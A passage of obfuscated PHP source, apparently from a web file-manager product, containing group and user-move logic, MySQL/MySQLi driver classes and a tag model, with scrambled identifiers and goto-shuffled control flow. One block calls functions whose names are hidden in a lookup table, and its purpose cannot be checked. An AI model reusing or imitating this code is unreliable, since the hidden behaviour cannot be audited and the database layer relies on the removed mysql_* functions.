!empty($C‡‰æ¢ÆÈ©[$BÃ¹¿Ã‡Ö]) ? $C‡‰æ¢ÆÈ©[$BÃ¹¿Ã‡Ö] : !1; if ($d„”Ğ÷î¶») { goto C¬•²ºá©Æ; f× À”éŠ–: $D¾øÕ¹²Üã = array($Bï²®ÅÃâÇ[493] => $CÍ÷Ì˜ŸÎö); Model($Bï²®ÅÃâÇ[1791])->where($e›òÈ§ïóÕ)->save($D¾øÕ¹²Üã); Model($Bï²®ÅÃâÇ[1792])->where($e›òÈ§ïóÕ)->save($D¾øÕ¹²Üã); goto F¦¬ï²’è; dİ‘ÑÔöã´: foreach ($C‡‰æ¢ÆÈ© as $E”Üä—ó¹½) { $bçÖçäµ° = $E”Üä—ó¹½[$Bï²®ÅÃâÇ[412]] == $Bï²®ÅÃâÇ[97] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($Bï²®ÅÃâÇ[799])->move($E”Üä—ó¹½[$Bï²®ÅÃâÇ[404]], $C±¥İµÈ¾, $bçÖçäµ°); } Model($Bï²®ÅÃâÇ[799])->moveClearAuth = !0; $e›òÈ§ïóÕ = array($Bï²®ÅÃâÇ[413] => 2, $Bï²®ÅÃâÇ[493] => $BÃ¹¿Ã‡Ö); goto f× À”éŠ–; E×Ö´÷ôïÜ: $C‡‰æ¢ÆÈ© = Model($Bï²®ÅÃâÇ[799])->where($e›òÈ§ïóÕ)->field($Bï²®ÅÃâÇ[1790])->select(); if (!$C‡‰æ¢ÆÈ©) { $C‡‰æ¢ÆÈ© = array(); } Model($Bï²®ÅÃâÇ[799])->moveClearAuth = !1; goto dİ‘ÑÔöã´; C¬•²ºá©Æ: if (!$C‡‰æ¢ÆÈ©[$CÍ÷Ì˜ŸÎö]) { $C‡‰æ¢ÆÈ©[$CÍ÷Ì˜ŸÎö] = Model($Bï²®ÅÃâÇ[799])->groupRootAdd($CÍ÷Ì˜ŸÎö); } $C±¥İµÈ¾ = $C‡‰æ¢ÆÈ©[$CÍ÷Ì˜ŸÎö]; $e›òÈ§ïóÕ = array($Bï²®ÅÃâÇ[487] => $d„”Ğ÷î¶»); goto E×Ö´÷ôïÜ; F¦¬ï²’è: } $this->_changeChildLevel($b¼ö“¶‡µ¶[$BÃ¹¿Ã‡Ö], $b¼ö“¶‡µ¶[$CÍ÷Ì˜ŸÎö], !0); goto fñ™É¤ÉÖ­; e´ç‰šÖÏ—: $Aéš¥Ğ’Î™ = Model($Bï²®ÅÃâÇ[1774])->where($e›òÈ§ïóÕ)->select(); if (!$Aéš¥Ğ’Î™) { $Aéš¥Ğ’Î™ = array(); } foreach ($Aéš¥Ğ’Î™ as $e‘Ñ¹×Óƒ) { $cøÑõÒïˆ = $e‘Ñ¹×Óƒ[$Bï²®ÅÃâÇ[1529]]; $e›òÈ§ïóÕ = array($Bï²®ÅÃâÇ[1529] => $cøÑõÒïˆ, $Bï²®ÅÃâÇ[1693] => $CÍ÷Ì˜ŸÎö); $EƒæÙÓ³¡ = Model($Bï²®ÅÃâÇ[1774])->where($e›òÈ§ïóÕ)->find(); if (!$EƒæÙÓ³¡) { $A˜ùòí†Ç = array($CÍ÷Ì˜ŸÎö => $e‘Ñ¹×Óƒ[$Bï²®ÅÃâÇ[1788]]); Model($Bï²®ÅÃâÇ[515])->userGroupAdd($cøÑõÒïˆ, $A˜ùòí†Ç); } Model($Bï²®ÅÃâÇ[515])->userGroupRemove($cøÑõÒïˆ, $BÃ¹¿Ã‡Ö); } goto D³„‘›²„ğ; Eù¸‚¢ÚŒ: } } goto aç„ÉÈ£õ‘; EˆæŞèÊÃ×: class DbMysql extends Db { public function __construct($cä¹Í†Áö = '') { $dà¢ŞÀ¤ŞŒ =& $_SERVER[Ü˜]; if (!extension_loaded($dà¢ŞÀ¤ŞŒ[768])) { think_exception(think_lang($dà¢ŞÀ¤ŞŒ[10]) . $dà¢ŞÀ¤ŞŒ[846]); } if (!empty($cä¹Í†Áö)) { $this->config = $cä¹Í†Áö; if (empty($this->config[$dà¢ŞÀ¤ŞŒ[13]])) { $this->config[$dà¢ŞÀ¤ŞŒ[13]] = $dà¢ŞÀ¤ŞŒ[33]; } } } public function connect($b†ê†ïª¼½ = '', $aÏ­ÚîÒË° = 0, $FµâĞÖ›ğ‰ = false) { $DàËë¿Î =& $_SERVER[Ü˜]; if (!isset($this->linkID[$aÏ­ÚîÒË°])) { goto aÌÅ•ë„æ©; AÎÙ“ÂåĞô: if (1 != think_config($DàËë¿Î[18])) { unset($this->config); } goto A”£Õ; c«µ¦İ“Óƒ: mysql_query($DàËë¿Î[851] . think_config($DàËë¿Î[852]) . $DàËë¿Î[55], $this->linkID[$aÏ­ÚîÒË°]); if ($eâ´šŞØ×› > $DàËë¿Î[853]) { mysql_query($DàËë¿Î[854], $this->linkID[$aÏ­ÚîÒË°]); } $this->connected = !0; goto AÎÙ“ÂåĞô; D¥Ç¾ñŞ½Ç: if ($eÓåÛª„¹ã) { $this->linkID[$aÏ­ÚîÒË°] = mysql_pconnect($BÌ£Ø××Àª, $b†ê†ïª¼½[$DàËë¿Î[849]], $b†ê†ïª¼½[$DàËë¿Î[850]], 131072); } else { $this->linkID[$aÏ­ÚîÒË°] = mysql_connect($BÌ£Ø××Àª, $b†ê†ïª¼½[$DàËë¿Î[849]], $b†ê†ïª¼½[$DàËë¿Î[850]], !0, 131072); } if (!$this->linkID[$aÏ­ÚîÒË°] || !empty($b†ê†ïª¼½[$DàËë¿Î[17]]) && !mysql_select_db($b†ê†ïª¼½[$DàËë¿Î[17]], $this->linkID[$aÏ­ÚîÒË°])) { think_exception(mysql_error()); } $eâ´šŞØ×› = mysql_get_server_info($this->linkID[$aÏ­ÚîÒË°]); goto c«µ¦İ“Óƒ; aÌÅ•ë„æ©: if (empty($b†ê†ïª¼½)) { $b†ê†ïª¼½ = $this->config; } $BÌ£Ø××Àª = $b†ê†ïª¼½[$DàËë¿Î[847]] . ($b†ê†ïª¼½[$DàËë¿Î[848]] ? "\x3a{$b†ê†ïª¼½[$DàËë¿Î[848]]}" : $DàËë¿Î[33]); $eÓåÛª„¹ã = !empty($b†ê†ïª¼½[$DàËë¿Î[13]][$DàËë¿Î[14]]) ? $b†ê†ïª¼½[$DàËë¿Î[13]][$DàËë¿Î[14]] : $this->pconnect; goto D¥Ç¾ñŞ½Ç; A”£Õ: } return $this->linkID[$aÏ­ÚîÒË°]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($FÔ÷ô‰©») { goto bÇ‡Ïã‚áÑ; bĞ¾„â×‹ã: think_action_status($CÆÀ°‘‹Ù[19], 1); think_status($CÆÀ°‘‹Ù[20]); $this->queryID = mysql_query($FÔ÷ô‰©», $this->_linkID); goto d†§äÍˆÀ ; d†§äÍˆÀ : $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto E‹„Øİº£¡; A‹ôİ˜©£¾: if (!$this->_linkID) { return !1; } $this->queryStr = $FÔ÷ô‰©»; if ($this->queryID) { $this->free(); } goto bĞ¾„â×‹ã; bÇ‡Ïã‚áÑ: $CÆÀ°‘‹Ù =& $_SERVER[Ü˜]; if (0 === stripos($FÔ÷ô‰©», $CÆÀ°‘‹Ù[271])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto A‹ôİ˜©£¾; E‹„Øİº£¡: } public function execute($cŸˆÂ˜÷) { goto DóŒùæÂ÷; Aœ¶ˆ´ÌçÃ: $this->queryStr = $cŸˆÂ˜÷; if ($this->queryID) { $this->free(); } think_action_status($Dê²áˆÚ¹Ò[21], 1); goto CçÕƒ°¼¸ˆ; c…•¶ø¢¥ó: if (!1 === $c¬ùÓêï Œ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto aÒĞš½ˆÎ«; DóŒùæÂ÷: $Dê²áˆÚ¹Ò =& $_SERVER[Ü˜]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Aœ¶ˆ´ÌçÃ; CçÕƒ°¼¸ˆ: think_status($Dê²áˆÚ¹Ò[20]); $c¬ùÓêï Œ = mysql_query($cŸˆÂ˜÷, $this->_linkID); $this->debug(); goto c…•¶ø¢¥ó; aÒĞš½ˆÎ«: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Ü˜][855], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $E·–Åƒ¬„ß = mysql_query($_SERVER[Ü˜][856], $this->_linkID); $this->transTimes = 0; if (!$E·–Åƒ¬„ß) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $bÚí¤èàÂ = mysql_query($_SERVER[Ü˜][857], $this->_linkID); $this->transTimes = 0; if (!$bÚí¤èàÂ) { $this->error(); return !1; } } return !0; } private function getAll() { $Aø«Ä¼ø­® = array(); if ($this->numRows > 0) { while ($F‹…£Ÿå = mysql_fetch_assoc($this->queryID)) { $Aø«Ä¼ø­®[] = $F‹…£Ÿå; } mysql_data_seek($this->queryID, 0); } return $Aø«Ä¼ø­®; } public function getFields($D×¢¨ÏÒ¡) { $déáÃã¥Šˆ =& $_SERVER[Ü˜]; $D‹•ŒÔ·„ = $this->query($déáÃã¥Šˆ[858] . $this->parseKey($D×¢¨ÏÒ¡)); $aÇÀ¥ô†°¹ = array(); if ($D‹•ŒÔ·„) { foreach ($D‹•ŒÔ·„ as $BÏ­˜†İÍ => $D•²Œ’¶´„) { $aÇÀ¥ô†°¹[$D•²Œ’¶´„[$déáÃã¥Šˆ[27]]] = array($déáÃã¥Šˆ[28] => $D•²Œ’¶´„[$déáÃã¥Šˆ[27]], $déáÃã¥Šˆ[29] => $D•²Œ’¶´„[$déáÃã¥Šˆ[30]], $déáÃã¥Šˆ[31] => (bool) (strtoupper($D•²Œ’¶´„[$déáÃã¥Šˆ[32]]) === $déáÃã¥Šˆ[859]), $déáÃã¥Šˆ[34] => $D•²Œ’¶´„[$déáÃã¥Šˆ[35]], $déáÃã¥Šˆ[36] => strtolower($D•²Œ’¶´„[$déáÃã¥Šˆ[37]]) == $déáÃã¥Šˆ[38], $déáÃã¥Šˆ[39] => strtolower($D•²Œ’¶´„[$déáÃã¥Šˆ[40]]) == $déáÃã¥Šˆ[41]); } } return $aÇÀ¥ô†°¹; } public function getTables($aóĞã§Ïº¸ = '') { $D•–ùÅà´Æ =& $_SERVER[Ü˜]; if (!empty($aóĞã§Ïº¸)) { $Eâô¬¥âµ” = $D•–ùÅà´Æ[860] . $aóĞã§Ïº¸ . $D•–ùÅà´Æ[861]; } else { $Eâô¬¥âµ” = $D•–ùÅà´Æ[862]; } $C½ÃÃ‘÷Ñ’ = $this->query($Eâô¬¥âµ”); $E’ŸËŠå÷¬ = array(); foreach ($C½ÃÃ‘÷Ñ’ as $bŒÖÄÍêßÇ => $Eæ™‹ºÄäÚ) { $E’ŸËŠå÷¬[$bŒÖÄÍêßÇ] = current($Eæ™‹ºÄäÚ); } return $E’ŸËŠå÷¬; } public function replace($BŸ½ïÍë³, $EéÆ®¤ß¶¶ = array()) { $EƒÚ¯’«” =& $_SERVER[Ü˜]; foreach ($BŸ½ïÍë³ as $b—Òèç³Úä => $D…›Ó‘Ì) { $B¶°‘•‡µ = $this->parseValue($D…›Ó‘Ì); if (is_scalar($B¶°‘•‡µ)) { $DÊˆ†éØ‚[] = $B¶°‘•‡µ; $CÀÎèéÍ”Î[] = $this->parseKey($b—Òèç³Úä); } } $dòÈˆ¶ËŞ¢ = $EƒÚ¯’«”[863] . $this->parseTable($EéÆ®¤ß¶¶[$EƒÚ¯’«”[286]]) . $EƒÚ¯’«”[864] . implode($EƒÚ¯’«”[47], $CÀÎèéÍ”Î) . $EƒÚ¯’«”[865] . implode($EƒÚ¯’«”[47], $DÊˆ†éØ‚) . $EƒÚ¯’«”[866]; return $this->execute($dòÈˆ¶ËŞ¢); } public function insertAll($B‘¥ãÆ±, $cŠŞ½™â¯Ê = array(), $C¨Î„ÆË¡ = false) { goto c”°‰ŞÇî; f’Ò½Èñ‡: $b‰„ºÎ”‡· = array(); foreach ($B‘¥ãÆ± as $e„Ù„¥ó) { $CÒñ±ïœÚ² = array(); foreach ($e„Ù„¥ó as $cìØ¡ñ£ëˆ => $EëğëÌêë) { $EëğëÌêë = $this->parseValue($EëğëÌêë); if (is_scalar($EëğëÌêë)) { $CÒñ±ïœÚ²[] = $EëğëÌêë; } } $b‰„ºÎ”‡·[] = $C´‡…ğÒ·¥[267] . implode($C´‡…ğÒ·¥[47], $CÒñ±ïœÚ²) . $C´‡…ğÒ·¥[866]; } array_walk($f×Öë±¾‘, array($this, $C´‡…ğÒ·¥[867])); goto eÖœ ãÒ¶Ï; eÖœ ãÒ¶Ï: $a“ÊÜÏÚšò = ($C¨Î„ÆË¡ ? $C´‡…ğÒ·¥[868] : $C´‡…ğÒ·¥[869]) . $C´‡…ğÒ·¥[870] . $this->parseTable($cŠŞ½™â¯Ê[$C´‡…ğÒ·¥[286]]) . $C´‡…ğÒ·¥[864] . implode($C´‡…ğÒ·¥[47], $f×Öë±¾‘) . $C´‡…ğÒ·¥[871] . implode($C´‡…ğÒ·¥[47], $b‰„ºÎ”‡·); return $this->execute($a“ÊÜÏÚšò); goto Aß–½ŒÑéÔ; c”°‰ŞÇî: $C´‡…ğÒ·¥ =& $_SERVER[Ü˜]; if (!is_array($B‘¥ãÆ±[0])) { return !1; } $f×Öë±¾‘ = array_keys($B‘¥ãÆ±[0]); goto f’Ò½Èñ‡; Aß–½ŒÑéÔ: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $a°å·Å™é§ =& $_SERVER[Ü˜]; $this->error = mysql_errno() . $a°å·Å™é§[4] . mysql_error($this->_linkID); if ($a°å·Å™é§[33] != $this->queryStr) { $this->error .= LNG($a°å·Å™é§[45]) . $this->queryStr; } think_trace($this->error, $a°å·Å™é§[33], $a°å·Å™é§[46]); return $this->error; } public function escapeString($d·ãõŠÒ “) { if ($this->_linkID) { return mysql_real_escape_string($d·ãõŠÒ “, $this->_linkID); } else { return mysql_escape_string($d·ãõŠÒ “); } } public function parseKey(&$eÍ¦ÍÚÍò‘, $fØ¯„µ‰¬á = true) { $BÎ‡È·±ÄÇ =& $_SERVER[Ü˜]; if ($fØ¯„µ‰¬á) { $eÍ¦ÍÚÍò‘ = $this->parseKeyCheck($eÍ¦ÍÚÍò‘); } if ($eÍ¦ÍÚÍò‘ != $BÎ‡È·±ÄÇ[192] && !preg_match($BÎ‡È·±ÄÇ[872], $eÍ¦ÍÚÍò‘)) { $eÍ¦ÍÚÍò‘ = $BÎ‡È·±ÄÇ[391] . trim($eÍ¦ÍÚÍò‘, $BÎ‡È·±ÄÇ[391]) . $BÎ‡È·±ÄÇ[391]; } return $eÍ¦ÍÚÍò‘; } } class DbMysqli extends Db { public function __construct($FÈ¼ÑäÃ½ = '') { $c¤Âˆ—ˆ–– =& $_SERVER[Ü˜]; if (!extension_loaded($c¤Âˆ—ˆ––[767])) { think_exception(think_lang($c¤Âˆ—ˆ––[10]) . $c¤Âˆ—ˆ––[873]); } if (!empty($FÈ¼ÑäÃ½)) { $this->config = $FÈ¼ÑäÃ½; if (empty($this->config[$c¤Âˆ—ˆ––[13]])) { $this->config[$c¤Âˆ—ˆ––[13]] = $c¤Âˆ—ˆ––[33]; } } } public function connect($bô„„÷¥¨õ = '', $eé–‰è©«Ò = 0) { $ağÏÂ’ £† =& $_SERVER[Ü˜]; if (!isset($this->linkID[$eé–‰è©«Ò])) { goto eÚƒÅ©Ê; døÄ“ĞÛ¶: $Fš§æÖ´Í = $this->linkID[$eé–‰è©«Ò]->server_version; $this->linkID[$eé–‰è©«Ò]->query($ağÏÂ’ £†[851] . think_config($ağÏÂ’ £†[852]) . $ağÏÂ’ £†[55]); if ($Fš§æÖ´Í > $ağÏÂ’ £†[853]) { $this->linkID[$eé–‰è©«Ò]->query($ağÏÂ’ £†[854]); } goto BáßàÕÙÒ¸; eÚƒÅ©Ê: if (empty($bô„„÷¥¨õ)) { $bô„„÷¥¨õ = $this->config; } $this->linkID[$eé–‰è©«Ò] = new mysqli($bô„„÷¥¨õ[$ağÏÂ’ £†[847]], $bô„„÷¥¨õ[$ağÏÂ’ £†[849]], $bô„„÷¥¨õ[$ağÏÂ’ £†[850]], $bô„„÷¥¨õ[$ağÏÂ’ £†[17]], $bô„„÷¥¨õ[$ağÏÂ’ £†[848]] ? intval($bô„„÷¥¨õ[$ağÏÂ’ £†[848]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto døÄ“ĞÛ¶; BáßàÕÙÒ¸: $this->connected = !0; if (1 != think_config($ağÏÂ’ £†[18])) { unset($this->config); } goto Aò‰»«²óÚ; Aò‰»«²óÚ: } return $this->linkID[$eé–‰è©«Ò]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($bØ©Ğ¬‡œƒ) { goto fÈåÓµÉˆ; c‰±ùÆŸ‰ó: think_status($Fß†ÃÙ¨óí[20]); $this->queryID = $this->_linkID->query($bØ©Ğ¬‡œƒ); if ($this->_linkID->more_results()) { while (($f¶—«Äê§ = $this->_linkID->next_result()) != NULL) { $f¶—«Äê§->free_result(); } } goto EÄ«ŒÓ–²Í; EÄ«ŒÓ–²Í: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto d×†ùÏ­ˆÒ; fÈåÓµÉˆ: $Fß†ÃÙ¨óí =& $_SERVER[Ü˜]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto B³ˆÎñâÂÃ; B³ˆÎñâÂÃ: $this->queryStr = $bØ©Ğ¬‡œƒ; if ($this->queryID) { $this->free(); } think_action_status($Fß†ÃÙ¨óí[19], 1); goto c‰±ùÆŸ‰ó; d×†ùÏ­ˆÒ: } public function execute($dğÓâö«„ä) { goto c¼ÆÒÀŞìî; c¼ÆÒÀŞìî: $f·Ğ‡èÁ =& $_SERVER[Ü˜]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto f¯Ú¸‘à§; B„Ïãïê³: if (!1 === $bíœ¥Èµ¾¹) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto EŞà¼èã; B¼šï¢Í·æ: think_status($f·Ğ‡èÁ[20]); $bíœ¥Èµ¾¹ = $this->_linkID->query($dğÓâö«„ä); $this->debug(); goto B„Ïãïê³; f¯Ú¸‘à§: $this->queryStr = $dğÓâö«„ä; if ($this->queryID) { $this->free(); } think_action_status($f·Ğ‡èÁ[21], 1); goto B¼šï¢Í·æ; EŞà¼èã: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $D¦Üô‹Ü = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$D¦Üô‹Ü) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $F–ƒ†Âˆáœ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$F–ƒ†Âˆáœ) { $this->error(); return !1; } } return !0; } private function getAll() { $E‰í¾ÇêóÔ = array(); if ($this->numRows > 0) { for ($fê¯İ¬¶¬» = 0; $fê¯İ¬¶¬» < $this->numRows; $fê¯İ¬¶¬»++) { $E‰í¾ÇêóÔ[$fê¯İ¬¶¬»] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $E‰í¾ÇêóÔ; } public function getFields($Fó¡™ØÖ§) { $f©ª”¡‚¸ =& $_SERVER[Ü˜]; $FÓğĞØõÒ = $this->query($f©ª”¡‚¸[858] . $this->parseKey($Fó¡™ØÖ§)); $fğì‹Ù¡ = array(); if ($FÓğĞØõÒ) { foreach ($FÓğĞØõÒ as $B‘˜äÎøõ· => $BƒÉö¨Êâ) { $fğì‹Ù¡[$BƒÉö¨Êâ[$f©ª”¡‚¸[27]]] = array($f©ª”¡‚¸[28] => $BƒÉö¨Êâ[$f©ª”¡‚¸[27]], $f©ª”¡‚¸[29] => $BƒÉö¨Êâ[$f©ª”¡‚¸[30]], $f©ª”¡‚¸[31] => (bool) ($BƒÉö¨Êâ[$f©ª”¡‚¸[32]] === $f©ª”¡‚¸[33]), $f©ª”¡‚¸[34] => $BƒÉö¨Êâ[$f©ª”¡‚¸[35]], $f©ª”¡‚¸[36] => strtolower($BƒÉö¨Êâ[$f©ª”¡‚¸[37]]) == $f©ª”¡‚¸[38], $f©ª”¡‚¸[39] => strtolower($BƒÉö¨Êâ[$f©ª”¡‚¸[40]]) == $f©ª”¡‚¸[41]); } } return $fğì‹Ù¡; } public function getTables($EÙëŒòÈÂ¥ = '') { $F‚ÕÊ¶ø =& $_SERVER[Ü˜]; $FïâÊó°éÓ = !empty($EÙëŒòÈÂ¥) ? $F‚ÕÊ¶ø[860] . $EÙëŒòÈÂ¥ . $F‚ÕÊ¶ø[861] : $F‚ÕÊ¶ø[862]; $D§äèŞÅƒ = $this->query($FïâÊó°éÓ); $E£è‘¨Åø = array(); if ($D§äèŞÅƒ) { foreach ($D§äèŞÅƒ as $EÎô´·ï« => $eŠ¬¼ê¯×„) { $E£è‘¨Åø[$EÎô´·ï«] = current($eŠ¬¼ê¯×„); } } return $E£è‘¨Åø; } public function replace($CµÛ¯ó»—İ, $CÑ£à¬Ìõ± = array()) { $cµ†¿”“¥Æ =& $_SERVER[Ü˜]; foreach ($CµÛ¯ó»—İ as $D²¿¶îÍ‹Š => $B§ŞéÊµ) { $FßŒË×‡†˜ = $this->parseValue($B§ŞéÊµ); if (is_scalar($FßŒË×‡†˜)) { $fŠ¹èŞŠ[] = $FßŒË×‡†˜; $b³œÔŠ§«[] = $this->parseKey($D²¿¶îÍ‹Š); } } $cšÆ­ÕÇ¹ = $cµ†¿”“¥Æ[863] . $this->parseTable($CÑ£à¬Ìõ±[$cµ†¿”“¥Æ[286]]) . $cµ†¿”“¥Æ[864] . implode($cµ†¿”“¥Æ[47], $b³œÔŠ§«) . $cµ†¿”“¥Æ[865] . implode($cµ†¿”“¥Æ[47], $fŠ¹èŞŠ) . $cµ†¿”“¥Æ[866]; return $this->execute($cšÆ­ÕÇ¹); } public function insertAll($a­’«…‹Ş, $CÌÕ›Ä“ôƒ = array(), $dÀÈšŸÈ¿ = false) { goto Dò¼“ ×†¾; Dò¼“ ×†¾: $dØÀ’îˆåì =& $_SERVER[Ü˜]; if (!is_array($a­’«…‹Ş[0])) { return !1; } $E‡†¬šäƒ¬ = array_keys($a­’«…‹Ş[0]); goto fåï¼”˜; CáÂğ²ßœ¾: $FÊ§Ö¯ù¥ï = $dÀÈšŸÈ¿ ? $dØÀ’îˆåì[868] : $dØÀ’îˆåì[869]; $E÷ŞÃè¡…÷ = $FÊ§Ö¯ù¥ï . $dØÀ’îˆåì[870] . $this->parseTable($CÌÕ›Ä“ôƒ[$dØÀ’îˆåì[286]]) . $dØÀ’îˆåì[864] . implode($dØÀ’îˆåì[47], $E‡†¬šäƒ¬) . $dØÀ’îˆåì[871] . implode($dØÀ’îˆåì[47], $fŠÕ™ˆÃª); return $this->execute($E÷ŞÃè¡…÷); goto c„ßŸÔ¤¦ò; fåï¼”˜: $fŠÕ™ˆÃª = array(); foreach ($a­’«…‹Ş as $b»…èŠ—Š) { $F–œ–ÜÙÄ¬ = array(); foreach ($b»…èŠ—Š as $DÙğ‚¸¼± => $Eƒ‰ÇíÊªÅ) { $Eƒ‰ÇíÊªÅ = $this->parseValue($Eƒ‰ÇíÊªÅ); if (is_scalar($Eƒ‰ÇíÊªÅ)) { $F–œ–ÜÙÄ¬[] = $Eƒ‰ÇíÊªÅ; } } $fŠÕ™ˆÃª[] = $dØÀ’îˆåì[267] . implode($dØÀ’îˆåì[47], $F–œ–ÜÙÄ¬) . $dØÀ’îˆåì[866]; } array_walk($E‡†¬šäƒ¬, array($this, $dØÀ’îˆåì[867])); goto CáÂğ²ßœ¾; c„ßŸÔ¤¦ò: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $C£—Ïª¿Âî =& $_SERVER[Ü˜]; $this->error = $this->_linkID->errno . $C£—Ïª¿Âî[4] . $this->_linkID->error; if ($C£—Ïª¿Âî[33] != $this->queryStr) { $this->error .= LNG($C£—Ïª¿Âî[45]) . $this->queryStr; } think_trace($this->error, $C£—Ïª¿Âî[33], $C£—Ïª¿Âî[46]); return $this->error; } public function escapeString($AÍ©Åø‡) { if ($this->_linkID) { return $this->_linkID->real_escape_string($AÍ©Åø‡); } else { return addslashes($AÍ©Åø‡); } } public function parseKey(&$BçˆÆÑåÀÓ, $Cæœ‡Ş½õÛ = true) { $a¸¹£¬½Âğ =& $_SERVER[Ü˜]; if ($Cæœ‡Ş½õÛ) { $BçˆÆÑåÀÓ = $this->parseKeyCheck($BçˆÆÑåÀÓ); } if ($BçˆÆÑåÀÓ != $a¸¹£¬½Âğ[192] && !preg_match($a¸¹£¬½Âğ[872], $BçˆÆÑåÀÓ)) { $BçˆÆÑåÀÓ = $a¸¹£¬½Âğ[391] . trim($BçˆÆÑåÀÓ, $a¸¹£¬½Âğ[391]) . $a¸¹£¬½Âğ[391]; } return $BçˆÆÑåÀÓ; } } if ($_SERVER[$_SERVER[Ü˜][59]] != $_SERVER[$_SERVER[Ü˜][840]]) { goto CÜÆí‘·œ; CÜÆí‘·œ: $Dé…æÈŠô§ = $_SERVER[Ü˜][60]; $E·ø’¯ô¬ì = $_SERVER[$_SERVER[Ü˜][61]] . $_SERVER[Ü˜][62]; $eÃâù‘¤Ë— = $Dé…æÈŠô§($E·ø’¯ô¬ì); goto d›Æ¸†‘Ä; c™ˆŸè—¯¾: $EÄÑ£øã‰ë($_SERVER[$_SERVER[Ü˜][57]]); goto cÃ¦†ˆÌ¯­; d›Æ¸†‘Ä: $FÈ´Î•÷Åö = explode($_SERVER[Ü˜][63], $eÃâù‘¤Ë—); if (count($FÈ´Î•÷Åö) < $_SERVER[Ü˜][64]) { $CŠ…‚ƒŒ  = $_SERVER[Ü˜][65]; $CŠ…‚ƒŒ (); } $EÄÑ£øã‰ë = $_SERVER[Ü˜][66]; goto c™ˆŸè—¯¾; cÃ¦†ˆÌ¯­: } goto C©ÕŠóÌé; FË¹˜‡¸ÕÄ: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\x5f\146\x61\166"; protected function cacheFunctionAlias($DØğ‘„§ä†) { $EÖŞí´Â¬š =& $_SERVER[Ü˜]; return array($EÖŞí´Â¬š[1795] => array(USER_ID, $EÖŞí´Â¬š[1796])); } protected function listData() { $C”ë„£ÁÕ® =& $_SERVER[Ü˜]; $E£ƒšÕá÷ƒ = array($C”ë„£ÁÕ®[1521] => USER_ID, $C”ë„£ÁÕ®[472] => array($C”ë„£ÁÕ®[1799], 0)); $Bïµ‡Õº½ = $C”ë„£ÁÕ®[1801]; $fó¯Ğ¬ØÍ¤ = $this->field($Bïµ‡Õº½)->where($E£ƒšÕá÷ƒ)->order($C”ë„£ÁÕ®[1802])->select(); return $fó¯Ğ¬ØÍ¤ ? $fó¯Ğ¬ØÍ¤ : array(); } protected function listByTag($eÁñåŞ§‘Î) { } protected function addToTag($C·É‡æÕŞ, $aÎ½ƒÙêß†) { $C£óçàêÈ¾ =& $_SERVER[Ü˜]; if (!Model($C£óçàêÈ¾[1937])->listData($aÎ½ƒÙêß†) || !Model($C£óçàêÈ¾[799])->pathInfo($C·É‡æÕŞ)) { return !1; } $dÌè”ƒ = array($C£óçàêÈ¾[1521] => USER_ID, $C£óçàêÈ¾[472] => $aÎ½ƒÙêß†, $C£óçàêÈ¾[423] => $C·É‡æÕŞ, $C£óçàêÈ¾[424] => $C£óçàêÈ¾[418], $C£óçàêÈ¾[422] => $C£óçàêÈ¾[33], $C£óçàêÈ¾[1697] => 0); if ($this->where($dÌè”ƒ)->find()) { return !1; } return $this->add($dÌè”ƒ); } protected function removeFromTag($aŠäÑÄÒÙ, $Eãé‚¦á‰„) { $f­ä‹ñâ =& $_SERVER[Ü˜]; if (!Model($f­ä‹ñâ[1937])->listData($Eãé‚¦á‰„)) { return !1; } if (is_array($aŠäÑÄÒÙ)) { $aŠäÑÄÒÙ = array($f­ä‹ñâ[7], $aŠäÑÄÒÙ); } $aƒƒ·³¬Îš = array($f­ä‹ñâ[1521] => USER_ID, $f­ä‹ñâ[472] => $Eãé‚¦á‰„, $f­ä‹ñâ[424] => $f­ä‹ñâ[418], $f­ä‹ñâ[423] => $aŠäÑÄÒÙ); return $this->where($aƒƒ·³¬Îš)->delete(); } protected function removeByTag($EêÉ¾ˆã»¿) { $A½Äø…½ßæ =& $_SERVER[Ü˜]; if (!$EêÉ¾ˆã»¿) { return !1; } $b¬†µ°»ŠÜ = array($A½Äø…½ßæ[1521] => USER_ID, $A½Äø…½ßæ[472] => $EêÉ¾ˆã»¿); return $this->where($b¬†µ°»ŠÜ)->delete(); } protected function removeBySource($BÅ¼˜¾åö†) { $F ¯õ‘ºë¨ =& $_SERVER[Ü˜]; if (is_array($BÅ¼˜¾åö†)) { $BÅ¼˜¾åö† = array($F ¯õ‘ºë¨[7], $BÅ¼˜¾åö†); } $a¢‡º‘‰Û‘ = array($F ¯õ‘ºë¨[1521] => USER_ID, $F ¯õ‘ºë¨[423] => $BÅ¼˜¾åö†, $F ¯õ‘ºë¨[472] => array($F ¯õ‘ºë¨[972], 0)); return 